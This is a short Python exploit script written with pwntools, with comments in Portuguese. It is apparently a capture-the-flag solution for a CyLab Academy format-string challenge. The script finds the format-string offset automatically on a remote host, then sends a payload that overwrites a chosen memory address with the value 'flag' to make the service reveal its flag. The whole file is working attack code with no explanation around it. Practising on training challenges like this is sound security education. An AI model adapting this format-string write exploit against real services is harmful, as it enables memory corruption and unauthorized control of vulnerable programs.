from pwn import *
context.bits = 64
context.arch = 'amd64'
context.log_level = 'debug'

##io = remote('xebec.cylabacademy.net', 21170)

def exec_fmt(payload):
    io = remote('chatelaine.cylabacademy.net', 23933)
    io.sendlineafter(b"What do you have to say?\n", payload)
    response = io.recvall()
    io.close()
    return response

# O FmtStr descobre o offset automaticamente testando o binário
autofmt = FmtStr(exec_fmt)
print(f"[+] Offset descoberto automaticamente: {autofmt.offset}")

# Configura o endereço e o valor alvo
sus_addr = 0x404048
target_value = 0x67616c66

# Gera o payload final utilizando o offset descoberto pelo FmtStr
payload = autofmt.write(sus_addr, target_value)

# Envia o payload definitivo para capturar a flag
io = remote('chatelaine.cylabacademy.net', 23933)
io.sendlineafter(b"What do you have to say?\n", payload)
print(io.recvall().decode(errors='ignore'))
